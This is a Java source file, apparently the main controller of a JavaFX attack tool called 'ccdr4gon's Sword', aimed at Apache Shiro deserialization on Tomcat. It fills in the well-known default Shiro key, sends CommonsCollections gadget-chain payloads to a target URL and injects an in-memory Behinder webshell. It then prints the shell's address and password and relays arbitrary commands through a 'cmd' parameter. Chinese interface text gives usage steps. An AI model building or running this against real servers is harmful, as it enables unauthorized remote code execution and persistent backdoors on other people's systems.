package ccdr4gon;

import ccdr4gon.utils.HttpUtil;
import javafx.collections.FXCollections;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.*;
import org.apache.commons.lang3.StringUtils;
import javafx.fxml.Initializable;

import java.net.URL;
import java.util.Random;
import java.util.ResourceBundle;

public class Controller implements Initializable {

    @FXML
    public TextField ShiroURLField;
    @FXML
    public Button ShiroExecuteButton;
    @FXML
    public Button ShiroInjectButton;
    @FXML
    public ChoiceBox ShiroMiddlewareBox;
    @FXML
    public ChoiceBox ShiroWebShellManagerBox;
    @FXML
    public TextField ShiroCommandField;
    @FXML
    public TextArea ShiroTextArea;
    @FXML
    public TextField ShiroKeyField;
    @FXML
    public CheckBox ShiroGBK;
    @FXML
    public CheckBox ShiroAlgorithm;
    @FXML
    public TextField ShiroPassField;
    @FXML
    public ChoiceBox ShiroChainBox;

    String generateRandomWord(int wordLength) {
        Random r = new Random(); // Intialize a Random Number Generator with SysTime as the seed
        StringBuilder sb = new StringBuilder(wordLength);
        for(int i = 0; i < wordLength; i++) { // For each letter in the word
            char tmp = (char) ('a' + r.nextInt('z' - 'a')); // Generate a letter between a and z
            sb.append(tmp); // Add it to the String
        }
        return sb.toString();
    }

    //execute cmd with echo
    public void ShiroExecuteHandler(ActionEvent event){
        String url=ShiroURLField.getText();
        String excuteurl;
        String cmd=ShiroCommandField.getText();
        Boolean gbk=ShiroGBK.isSelected();
        if(gbk){
            excuteurl=url+"&stage=echo&gbk=true&cmd="+cmd;
        }else {
            excuteurl=url+"&stage=echo&gbk=false&cmd="+cmd;
        }
        if (!excuteurl.contains("?"))
            excuteurl=excuteurl.replaceFirst("&","?");
        try {
            byte[] res_bytes=HttpUtil.get(excuteurl,"");
            String res;
            if(gbk){
                res=new String(res_bytes,"GBK");
            }
            else {
                res=new String(res_bytes);
            }
            String result=StringUtils.substringBefore(res,"=========end=========");
            if(result.equals(res)){
                ShiroTextArea.appendText("命令执行失败!\n");
            }else {
                ShiroTextArea.appendText(result);
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    //inject
    public void ShiroInjectHandler(ActionEvent event) {
        //get input
        byte[] key =java.util.Base64.getDecoder().decode(ShiroKeyField.getText());
        String middleware=ShiroMiddlewareBox.getValue().toString();
        String chain=ShiroChainBox.getValue().toString();
        String url=ShiroURLField.getText();
        String pass=ShiroPassField.getText();
        boolean is_gcm=ShiroAlgorithm.isSelected();
        String loadurl,shellurl;

        try {
            String initPayload=InitFactory.getpayload(middleware,chain,key,is_gcm);
            String loadPayload=LoadFactory.getPayload(middleware,pass);



            HttpUtil.get(url, initPayload);

            if (url.contains("?")) {
                loadurl = url + "&stage=init";
            } else {
                loadurl = url + "?stage=init";
            }

            HttpUtil.post(loadurl, "", loadPayload);
            ShiroTextArea.appendText("注入完成\n");

            if (url.contains("?")) {
                shellurl = url + "&stage=s";
            } else {
                shellurl = url + "?stage=s";
            }

            ShiroTextArea.appendText("冰蝎连接地址:\n"+shellurl+"\n");
            ShiroTextArea.appendText("冰蝎连接密码:\n"+pass+"\n\n");

        }catch (Exception e){
            e.printStackTrace();
        }


    }
    @Override
    public void initialize (URL url, ResourceBundle rb)
    {
        ShiroWebShellManagerBox.setItems(FXCollections.observableArrayList("Behinder3"));
        ShiroMiddlewareBox.setItems(FXCollections.observableArrayList("Tomcat8/9","Tomcat7"));
        ShiroChainBox.setItems(FXCollections.observableArrayList("CommonsCollectionsK1_1","CommonsCollectionsK1_1_For_CC4"));
        //default value
        ShiroKeyField.appendText("kPH+bIxk5D2deZiIxcaaaA==");
        ShiroWebShellManagerBox.setValue("Behinder3");
        ShiroMiddlewareBox.setValue("Tomcat8/9");
        ShiroPassField.appendText(generateRandomWord(16));
        ShiroChainBox.setValue("CommonsCollectionsK1_1");

        //绑定事件
        ShiroInjectButton.setOnAction(this::ShiroInjectHandler);
        ShiroExecuteButton.setOnAction(this::ShiroExecuteHandler);

        ShiroTextArea.appendText("ccdr4gon's Sword -- 俺寻思好像能使的0.0.3版本\n");
        ShiroTextArea.appendText("Tomcat包括SpringBoot的嵌入式Tomcat(默认Web容器),直接使用即可\n");
        ShiroTextArea.appendText("使用方法:\n点击Inject注入,可以执行命令，并且此Tomcat能解析的任何路径都可以连接内存马(需要添加get参数stage=s)\n");
        ShiroTextArea.appendText("==============================================================================================\n\n");
    }
}
